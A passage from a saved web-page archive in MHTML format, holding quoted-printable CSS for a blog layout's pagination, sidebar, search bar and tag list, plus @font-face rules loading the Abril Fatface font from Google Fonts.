 background: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.16) 1px 1px 1p=
x; }

.pagination > a:hover { background-color: rgb(229, 229, 229); }

* + .pagination { margin-top: 2rem; }

.content .pagination:first-child { margin-top: -4rem; }

.index #sidebar { padding-bottom: calc(2rem + 1em); }

.home.index #sidebar { padding-bottom: 2rem; }

@media (min-width: 49rem) {
  .pagination > a { box-shadow: none; }
  .pagination > a:hover { box-shadow: rgba(0, 0, 0, 0.16) 1px 1px 1px; }
  .content .pagination:first-child { margin-top: 0px; }
  .content .pagination:first-child + * { padding-top: 2rem; border-top: 1px=
 solid rgb(229, 229, 229); margin-top: 2rem; }
  .index #sidebar { padding-bottom: 2rem; }
}

.message { margin-bottom: 1rem; padding: 1rem; color: rgb(113, 113, 113); b=
ackground-color: rgb(249, 249, 249); }

.search-row { display: flex; border: 1px solid rgb(229, 229, 229); border-r=
adius: 300px; padding: 2px; }

.search-row input { border: 0px; }

.search-row input + input { margin-left: 2px; }

.search-row input[type=3D"text"], .search-row input[type=3D"search"] { flex=
-grow: 1; }

.tags-list a { margin-right: 0.5em; white-space: nowrap; opacity: 0.75; }

.tags-list a .tag-count { background: rgb(38, 139, 210); color: rgba(255, 2=
55, 255, 0.8); margin-left: 0.25em; border-radius: 1000px; font-size: 0.75e=
m; padding-left: 0.6em; padding-right: 0.6em; }

.tags-list a:hover { text-decoration: none; opacity: 1; }

@keyframes posts-for-tag-fade-in {=20
  0% { opacity: 0; }
  100% { opacity: 1; }
}

.posts-for-tag { display: none; }

.posts-for-tag:target { display: block; animation: 0.6s ease-in-out 0s 1 no=
rmal none running posts-for-tag-fade-in; }
------MultipartBoundary--HOuxZ2DQ0gQYS6F4mCJUmsOk3TTuYF8VKIn3YnDj2R----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://fonts.googleapis.com/css?family=Abril+Fatface

@charset "utf-8";

@font-face { font-family: "Abril Fatface"; font-style: normal; font-weight:=
 400; src: url("https://fonts.gstatic.com/s/abrilfatface/v12/zOL64pLDlL1D99=
S8g8PtiKchq-lmjdLh.woff2") format("woff2"); unicode-range: U+100-24F, U+259=
, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A72=
0-A7FF; }

@font-face { font-family: "Abril Fatface"; font-style: normal; font-weight:=
 400; src: url("https://fonts.gstatic.com/s/abrilfatface/v12/zOL64pLDlL1D99=
S8g8PtiKchq-dmjQ.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+1=
52-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122=
, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
------MultipartBoundary--HOuxZ2DQ0gQYS6F4mCJUmsOk3TTuYF8VKIn3YnDj2R------
